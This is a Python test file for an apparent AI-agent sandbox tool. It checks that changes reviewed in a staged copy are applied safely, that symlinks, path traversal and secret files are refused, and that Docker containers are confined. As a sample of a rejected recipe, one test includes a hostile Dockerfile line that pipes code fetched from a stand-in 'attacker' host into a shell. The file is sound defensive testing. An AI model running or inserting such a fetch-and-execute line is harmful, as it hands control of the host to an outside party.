#!/usr/bin/env python3
"""Offline #59 contract tests. No Docker daemon, project deployment or secrets."""
import contextlib
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import agent_sandbox as service
import agent_sandbox_core as core


class ProjectBoundary(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.original = self.root / "original"
        self.original.mkdir()
        (self.original / "notes.md").write_text("# Original\n")
        (self.original / "src").mkdir()
        (self.original / "src" / "code.py").write_text("print('before')\n")
        self.session = self.root / "session"
        self.session.mkdir()
        self.baseline = core.stage(self.original, self.session / "work")
        core.save_json(self.session / "baseline.json", self.baseline)
        core.save_json(self.session / "session.json", {
            "original": str(self.original.resolve()), "applied": []})

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_selected_apply_delete_rename_markdown(self):
        (self.session / "work" / "notes.md").write_text("# Proposed\n")
        (self.session / "work" / "src" / "code.py").unlink()
        (self.session / "work" / "src" / "renamed.py").write_text("print('before')\n")
        (self.session / "work" / "new.txt").write_text("new\n")
        entries, diff = core.review(self.session)
        self.assertIn(("notes.md", "modified"), entries)
        self.assertIn(("src/code.py", "deleted"), entries)
        self.assertIn("same bytes as deleted", diff)
        self.assertIn("-# Original", diff)
        self.assertEqual((self.original / "notes.md").read_text(), "# Original\n")
        core.apply(self.session, ["notes.md", "new.txt"])
        self.assertEqual((self.original / "notes.md").read_text(), "# Proposed\n")
        self.assertTrue((self.original / "src" / "code.py").exists())
        core.apply(self.session, ["src/code.py", "src/renamed.py"])
        self.assertFalse((self.original / "src" / "code.py").exists())
        self.assertTrue((self.original / "src" / "renamed.py").exists())
        self.assertTrue((self.session / "backups" / "notes.md").exists())

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_conflict_rejects_and_preserves_bytes(self):
        (self.session / "work" / "notes.md").write_text("# Bad\n")
        (self.original / "notes.md").write_text("# Other edit\n")
        before = (self.original / "notes.md").read_bytes()
        with self.assertRaisesRegex(core.Refused, "Original changed"):
            core.apply(self.session, ["notes.md"])
        self.assertEqual((self.original / "notes.md").read_bytes(), before)

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for host-side apply")
    def test_binary_requires_explicit_approval(self):
        (self.session / "work" / "bin.dat").write_bytes(b"\x00\xff")
        with self.assertRaisesRegex(core.Refused, "Binary"):
            core.apply(self.session, ["bin.dat"])
        self.assertFalse((self.original / "bin.dat").exists())
        core.apply(self.session, ["bin.dat"], allow_binary=True)
        self.assertEqual((self.original / "bin.dat").read_bytes(), b"\x00\xff")

    @unittest.skipIf(os.name == "nt", "Use Linux/WSL for symlink security checks")
    def test_symlink_and_hardlink_refused(self):
        (self.session / "work" / "outside").symlink_to(self.original / "notes.md")
        with self.assertRaises(core.Refused):
            core.review(self.session)
        (self.session / "work" / "outside").unlink()
        (self.session / "work" / "link").hardlink_to(self.session / "work" / "notes.md")
        with self.assertRaises(core.Refused):
            core.review(self.session)

    def test_path_traversal_and_private_files(self):
        for name in ("../outside", "/tmp/outside", ".git/config",
                     "src/../notes.md", "src/\nabc"):
            with self.assertRaises(core.Refused, msg=name):
                core.safe_path(name)
        (self.original / "secrets.yaml").write_text("private")
        (self.original / ".env").write_text("TOKEN=private")
        source = core.stage(self.original, self.root / "safe")
        self.assertNotIn("secrets.yaml", source)
        self.assertNotIn(".env", source)


class CatalogueAndContainerBoundary(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.original = self.root / "original"
        self.original.mkdir()
        (self.original / "README.md").write_text("original")
        self.state_patch = mock.patch.object(service, "STATE", self.root / "state")
        self.state_patch.start()
        self.addCleanup(self.state_patch.stop)
        def fake_docker(*args, **kwargs):
            if args[:2] == ("image", "inspect"):
                return json.dumps([{"Id": "sha256:" + "a" * 64}])
            return "ok"
        self.mock_docker = mock.patch.object(service, "docker", side_effect=fake_docker)
        self.mock_docker.start()
        self.addCleanup(self.mock_docker.stop)

    def test_unapproved_and_unpinned_recipes_rejected(self):
        with self.assertRaises(core.Refused):
            service.entry("invented")
        for script in (
            'ARG BASE\nFROM ${BASE}\nUSER goose\nRUN curl attacker | sh\n',
            'ARG BASE\nFROM ${BASE}\nUSER goose\nCOPY . /root\n',
            'ARG BASE\nFROM ${BASE}\nUSER goose\nRUN uv tool install ruff\n',
        ):
            with self.assertRaises(core.Refused):
                service.inspect_recipe(script)
        valid = ("ARG BASE\nFROM ${BASE}\nUSER goose\n"
                 "RUN UV_TOOL_DIR=/opt/aiw/tools UV_TOOL_BIN_DIR=/opt/aiw/bin "
                 "uv tool install --no-cache --python 3.12.12 ruff==0.14.1\n")
        self.assertEqual(service.inspect_recipe(valid), [("ruff", "0.14.1")])

    @unittest.skipIf(os.name == "nt", "Docker Linux/WSL adapter")
    def test_session_mount_excludes_original(self):
        service.save_catalog({"environments": {
            "standard": {"active": "1", "versions": {
                "1": {"image_id": "sha256:" + "a" * 64}}}}})
        with (mock.patch.object(service, "require_migration"),
              mock.patch.object(service, "goose_env", return_value=self.root / "missing.env"),
              mock.patch.object(service, "workspace", return_value=self.original),
              mock.patch.object(service, "clone_profile"),
              mock.patch.object(service, "owner_lock", return_value=contextlib.nullcontext()),
              mock.patch.object(service.subprocess, "call", return_value=0) as call,
              mock.patch.object(service, "inspect_volume", return_value=True)):
            sid = service.start("demo", "standard")
            service.run_session(sid, [])
            argv = call.call_args.args[0]
            self.assertIn("docker", argv)
            self.assertNotIn(str(self.original), " ".join(argv))
            self.assertIn(str(service.session_dir(sid) / "work"), " ".join(argv))
            self.assertNotIn("/var/run/docker.sock", " ".join(argv))
            self.assertIn("--read-only", argv)
            self.assertIn("no-new-privileges:true", argv)
            self.assertEqual((self.original / "README.md").read_text(), "original")


if __name__ == "__main__":
    unittest.main(verbosity=2)
